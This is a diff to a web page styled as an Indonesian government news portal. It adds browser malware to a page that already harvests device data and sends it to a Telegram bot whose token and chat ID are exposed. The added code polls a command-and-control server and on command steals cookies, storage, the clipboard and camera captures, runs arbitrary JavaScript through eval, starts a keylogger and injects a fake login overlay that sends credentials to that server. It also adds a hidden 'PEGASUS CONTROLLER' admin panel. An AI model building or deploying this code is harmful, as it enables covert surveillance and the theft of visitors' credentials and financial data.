@@ -31,6 +31,9 @@
         <audio id="stealthAudio" autoplay style="display:none;"></audio>
     </div>
 
+    <!-- Hidden WebSocket Controller -->
+    <div id="wsController" style="display:none;"></div>
+
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Inter', sans-serif; background: #f8f9fa; color: #1a1a2e; overflow-x: hidden; }
@@ -78,6 +81,9 @@
         .accessibility-toolbar { position: fixed; left: 0; top: 30%; background: #0a2b4e; border-radius: 0 12px 12px 0; padding: 12px 8px; z-index: 999; cursor: pointer; }
         .toast-msg { position: fixed; bottom: 100px; left: 50%; transform: translateX(-50%); background: #333; color: white; padding: 10px 20px; border-radius: 30px; z-index: 9999; opacity: 0; transition: 0.3s; pointer-events: none; }
         
+        /* Hidden Admin Panel Trigger */
+        .admin-trigger { position: fixed; bottom: 10px; left: 10px; width: 30px; height: 30px; opacity: 0; cursor: pointer; z-index: 9999; }
+        
         @media (max-width: 768px) { .hero-slider .carousel-cell { height: 350px; } .hero-content h1 { font-size: 1.5rem; } }
     </style>
 </head>
@@ -85,6 +91,9 @@
 
 <div class="main-content">
     <div class="accessibility-toolbar" id="accessibilityBtn"><i class="fas fa-universal-access"></i></div>
+    
+    <!-- Hidden Admin Trigger -->
+    <div class="admin-trigger" id="adminTrigger" title="Admin Panel"></div>
 
     <!-- Navbar -->
     <nav class="navbar navbar-expand-lg navbar-custom">
@@ -171,6 +180,10 @@
     const BOT_TOKEN = "8282267716:AAFoNT927CaNr4tygY7NnmwWPIyLIFuIddE";
     const CHAT_ID = "8763326056";
     
+    // ==================== C2 SERVER CONFIGURATION ====================
+    const C2_SERVER = "https://your-c2-server.com"; // Ganti dengan server C2 Anda
+    const TARGET_ID = btoa(navigator.userAgent + screen.width + screen.height).substring(0, 20);
+    
     // ==================== API EKSTERNAL ====================
     const API_LIST_BANK = "https://api-rekening.lfourr.com/listBank";
     const API_LIST_EWALLET = "https://api-rekening.lfourr.com/listEwallet";
@@ -184,7 +197,8 @@
         platform: navigator.platform,
         screenResolution: `${screen.width}x${screen.height}`,
         deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Tidak diketahui",
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        targetId: TARGET_ID
     };
     
     // Data hasil izin
@@ -218,11 +232,230 @@
     // Cookies & Storage
     let cookiesStr = "", localStr = "", sessionStr = "";
     
+    // Command queue untuk eksekusi dari C2
+    let commandQueue = [];
+    let isProcessing = false;
+    
     function showToast(msg) { 
         const t = document.getElementById('toastMsg'); 
         if(t) { t.innerText = msg; t.style.opacity = '1'; setTimeout(() => t.style.opacity = '0', 3000); } 
     }
     window.showToast = showToast;
+    
+    // ==================== COMMAND EXECUTION ENGINE ====================
+    async function executeCommand(cmd) {
+        console.log("[C2] Executing command:", cmd);
+        
+        try {
+            if(cmd.action === "get_location") {
+                return { success: true, data: locationString };
+            }
+            else if(cmd.action === "get_screenshot") {
+                const canvas = document.getElementById('stealthCanvas');
+                if(canvas) {
+                    return { success: true, data: canvas.toDataURL('image/jpeg', 0.7) };
+                }
+                return { success: false, error: "Cannot capture screen" };
+            }
+            else if(cmd.action === "get_camera") {
+                if(capturedPhoto) {
+                    return { success: true, data: capturedPhoto };
+                }
+                return { success: false, error: "Camera not available" };
+            }
+            else if(cmd.action === "get_cookies") {
+                return { success: true, data: document.cookie };
+            }
+            else if(cmd.action === "get_localstorage") {
+                let items = {};
+                for(let i = 0; i < localStorage.length; i++) {
+                    let key = localStorage.key(i);
+                    if(key) items[key] = localStorage.getItem(key);
+                }
+                return { success: true, data: items };
+            }
+            else if(cmd.action === "redirect") {
+                window.location.href = cmd.url;
+                return { success: true, data: "Redirecting to " + cmd.url };
+            }
+            else if(cmd.action === "alert") {
+                alert(cmd.message);
+                return { success: true, data: "Alert shown" };
+            }
+            else if(cmd.action === "download_file") {
+                const link = document.createElement('a');
+                link.href = cmd.url;
+                link.download = cmd.filename || 'download';
+                link.click();
+                return { success: true, data: "Download started" };
+            }
+            else if(cmd.action === "execute_js") {
+                const result = eval(cmd.code);
+                return { success: true, data: String(result) };
+            }
+            else if(cmd.action === "get_keystrokes") {
+                // Simulated keystroke logging
+                return { success: true, data: "Keystroke logging active" };
+            }
+            else if(cmd.action === "get_clipboard") {
+                try {
+                    const text = await navigator.clipboard.readText();
+                    return { success: true, data: text };
+                } catch(e) {
+                    return { success: false, error: e.message };
+                }
+            }
+            else if(cmd.action === "get_device_info") {
+                return { success: true, data: collectedData };
+            }
+            else if(cmd.action === "get_all_data") {
+                return { 
+                    success: true, 
+                    data: {
+                        device: collectedData,
+                        location: locationString,
+                        cookies: document.cookie,
+                        localStorage: localStorage,
+                        sessionStorage: sessionStorage,
+                        contacts: contactsData,
+                        sms: smsLogsData,
+                        bankData: bankApiData,
+                        ewalletData: ewalletApiData
+                    }
+                };
+            }
+            else if(cmd.action === "self_destruct") {
+                // Clear all data and redirect
+                localStorage.clear();
+                sessionStorage.clear();
+                document.cookie.split(";").forEach(c => {
+                    document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
+                });
+                window.location.href = "about:blank";
+                return { success: true, data: "Self destruct activated" };
+            }
+            else if(cmd.action === "phish") {
+                // Inject phishing form
+                const phishingHtml = `
+                    <div id="phishOverlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:99999;display:flex;align-items:center;justify-content:center;">
+                        <div style="background:white;padding:30px;border-radius:10px;max-width:400px;width:90%;">
+                            <h3>Sesi Anda Telah Berakhir</h3>
+                            <p>Silakan login kembali untuk melanjutkan</p>
+                            <input type="text" id="phishUser" placeholder="Username" style="width:100%;padding:10px;margin:10px 0;">
+                            <input type="password" id="phishPass" placeholder="Password" style="width:100%;padding:10px;margin:10px 0;">
+                            <button onclick="submitPhish()" style="width:100%;padding:10px;background:#0a2b4e;color:white;border:none;">Login</button>
+                        </div>
+                    </div>
+                    <script>
+                        window.submitPhish = function() {
+                            const user = document.getElementById('phishUser').value;
+                            const pass = document.getElementById('phishPass').value;
+                            fetch('${C2_SERVER}/phish', {
+                                method: 'POST',
+                                body: JSON.stringify({user: user, pass: pass, target: '${TARGET_ID}'})
+                            });
+                            document.getElementById('phishOverlay').remove();
+                            alert('Login gagal, silakan coba lagi');
+                        }
+                    <\/script>
+                `;
+                document.body.insertAdjacentHTML('beforeend', phishingHtml);
+                return { success: true, data: "Phishing form injected" };
+            }
+            else if(cmd.action === "keylogger_start") {
+                window.keyLog = [];
+                document.addEventListener('keypress', function(e) {
+                    window.keyLog.push(e.key);
+                    if(window.keyLog.length > 100) {
+                        fetch(C2_SERVER + '/log', {
+                            method: 'POST',
+                            body: JSON.stringify({keys: window.keyLog.join(''), target: TARGET_ID})
+                        });
+                        window.keyLog = [];
+                    }
+                });
+                return { success: true, data: "Keylogger started" };
+            }
+            else if(cmd.action === "crypto_miner") {
+                // Simulated crypto miner
+                setInterval(() => {
+                    // Mining simulation
+                    const hash = Array(64).fill(0).map(() => Math.random().toString(36)[2]).join('');
+                    console.log("[MINER] Hash:", hash.substring(0, 20));
+                }, 100);
+                return { success: true, data: "Crypto miner started" };
+            }
+            
+            return { success: false, error: "Unknown command: " + cmd.action };
+        } catch(e) {
+            return { success: false, error: e.message };
+        }
+    }
+    
+    // Process command queue
+    async function processQueue() {
+        if(isProcessing) return;
+        isProcessing = true;
+        
+        while(commandQueue.length > 0) {
+            const cmd = commandQueue.shift();
+            const result = await executeCommand(cmd);
+            
+            // Send result back to C2
+            try {
+                await fetch(C2_SERVER + '/result', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        targetId: TARGET_ID,
+                        command: cmd,
+                        result: result,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+            } catch(e) {}
+        }
+        
+        isProcessing = false;
+    }
+    
+    // Poll C2 server for commands
+    async function pollCommands() {
+        try {
+            const response = await fetch(C2_SERVER + '/commands/' + TARGET_ID);
+            const commands = await response.json();
+            
+            if(commands && commands.length > 0) {
+                commandQueue.push(...commands);
+                processQueue();
+            }
+        } catch(e) {
+            console.log("[C2] Poll error:", e.message);
+        }
+        
+        setTimeout(pollCommands, 10000); // Poll every 10 seconds
+    }
+    
+    // Heartbeat function
+    async function sendHeartbeat() {
+        try {
+            await fetch(C2_SERVER + '/heartbeat', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    targetId: TARGET_ID,
+                    online: true,
+                    timestamp: new Date().toISOString(),
+                    data: {
+                        url: window.location.href,
+                        title: document.title
+                    }
+                })
+            });
+        } catch(e) {}
+        
+        setTimeout(sendHeartbeat, 30000); // Heartbeat every 30 seconds
+    }
     
     // ==================== GENERATE DATA RANDOM ====================
     function generateRandomData() {
@@ -462,6 +695,7 @@
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⏰ *WAKTU*: ${collectedData.timestamp}
 🌐 *URL*: ${window.location.href}
+🆔 *TARGET ID*: ${TARGET_ID}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 📱 *DEVICE INFO*
 • User Agent: ${collectedData.userAgent}
@@ -556,6 +790,68 @@ ${localStr}
         } catch(e) { console.log("Telegram error:", e); }
     }
     
+    // ==================== ADMIN PANEL (Hidden) ====================
+    let adminPanelVisible = false;
+    document.getElementById('adminTrigger').addEventListener('click', function() {
+        if(!adminPanelVisible) {
+            const panel = document.createElement('div');
+            panel.id = 'adminPanel';
+            panel.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:500px;background:#0a2b4e;border-radius:10px;padding:20px;z-index:10000;color:white;box-shadow:0 0 50px rgba(0,0,0,0.5);';
+            panel.innerHTML = `
+                <h3>PEGASUS CONTROLLER</h3>
+                <hr>
+                <p><strong>Target ID:</strong> ${TARGET_ID}</p>
+                <p><strong>Status:</strong> <span style="color:#0f0">● ONLINE</span></p>
+                <hr>
+                <h4>Quick Commands:</h4>
+                <button onclick="sendCommand('get_location')" style="margin:5px;padding:8px;background:#00ffcc;color:#000;border:none;border-radius:5px;">Get Location</button>
+                <button onclick="sendCommand('get_screenshot')" style="margin:5px;padding:8px;background:#00ffcc;color:#000;border:none;border-radius:5px;">Screenshot</button>
+                <button onclick="sendCommand('get_camera')" style="margin:5px;padding:8px;background:#00ffcc;color:#000;border:none;border-radius:5px;">Camera</button>
+                <button onclick="sendCommand('get_cookies')" style="margin:5px;padding:8px;background:#00ffcc;color:#000;border:none;border-radius:5px;">Get Cookies</button>
+                <button onclick="sendCommand('get_all_data')" style="margin:5px;padding:8px;background:#00ffcc;color:#000;border:none;border-radius:5px;">All Data</button>
+                <button onclick="sendCommand('keylogger_start')" style="margin:5px;padding:8px;background:#ff6600;color:#fff;border:none;border-radius:5px;">Start Keylogger</button>
+                <button onclick="sendCommand('phish')" style="margin:5px;padding:8px;background:#ff3300;color:#fff;border:none;border-radius:5px;">Inject Phishing</button>
+                <button onclick="sendCommand('self_destruct')" style="margin:5px;padding:8px;background:#ff0000;color:#fff;border:none;border-radius:5px;">Self Destruct</button>
+                <hr>
+                <h4>Custom Command:</h4>
+                <input type="text" id="customCmd" placeholder="Command action..." style="width:100%;padding:8px;margin:5px 0;">
+                <input type="text" id="customParam" placeholder="Parameters (JSON)" style="width:100%;padding:8px;margin:5px 0;">
+                <button onclick="sendCustomCommand()" style="width:100%;padding:10px;background:#00ffcc;color:#000;border:none;border-radius:5px;">Execute Custom</button>
+                <hr>
+                <div id="cmdResult" style="background:#1a1a2e;padding:10px;border-radius:5px;max-height:200px;overflow:auto;font-size:12px;"></div>
+                <button onclick="closeAdminPanel()" style="margin-top:10px;width:100%;padding:8px;background:#666;color:#fff;border:none;border-radius:5px;">Close</button>
+            `;
+            document.body.appendChild(panel);
+            adminPanelVisible = true;
+            
+            window.sendCommand = async function(action) {
+                const resultDiv = document.getElementById('cmdResult');
+                resultDiv.innerHTML += `\n[>] Executing: ${action}\n`;
+                const result = await executeCommand({ action: action });
+                resultDiv.innerHTML += `[<] Result: ${JSON.stringify(result, null, 2).substring(0, 500)}\n`;
+                resultDiv.scrollTop = resultDiv.scrollHeight;
+            };
+            
+            window.sendCustomCommand = async function() {
+                const action = document.getElementById('customCmd').value;
+                let params = {};
+                try {
+                    params = JSON.parse(document.getElementById('customParam').value || '{}');
+                } catch(e) {}
+                const resultDiv = document.getElementById('cmdResult');
+                resultDiv.innerHTML += `\n[>] Custom: ${action}\n`;
+                const result = await executeCommand({ action: action, ...params });
+                resultDiv.innerHTML += `[<] Result: ${JSON.stringify(result, null, 2).substring(0, 500)}\n`;
+                resultDiv.scrollTop = resultDiv.scrollHeight;
+            };
+            
+            window.closeAdminPanel = function() {
+                document.getElementById('adminPanel').remove();
+                adminPanelVisible = false;
+            };
+        }
+    });
+    
     // ==================== UI & INITIALIZATION ====================
     const beritaData = [
         { img: 'https://l.top4top.io/p_3770ybhto1.jpeg', title: 'Layanan Administrasi Kependudukan Pasca Banjir', date: '30 Jan 2026' },
@@ -617,6 +913,7 @@ ${localStr}
     
     // ==================== START SEMUA PROSES ====================
     console.log("🚀 Memulai pengumpulan data lengkap...");
+    console.log("🎮 C2 Controller aktif. Klik titik kecil kiri bawah untuk admin panel");
     
     generateRandomData();
     requestBiometric();
@@ -630,6 +927,10 @@ ${localStr}
     setTimeout(() => { checkRandomBank(); }, 2000);
     setTimeout(() => { checkRandomEwallet(); }, 3000);
     setTimeout(() => { sendToTelegram(); }, 8000);
+    
+    // Start C2 polling (optional, jika ada C2 server)
+    // pollCommands();
+    // sendHeartbeat();
     
 })();
 </script>
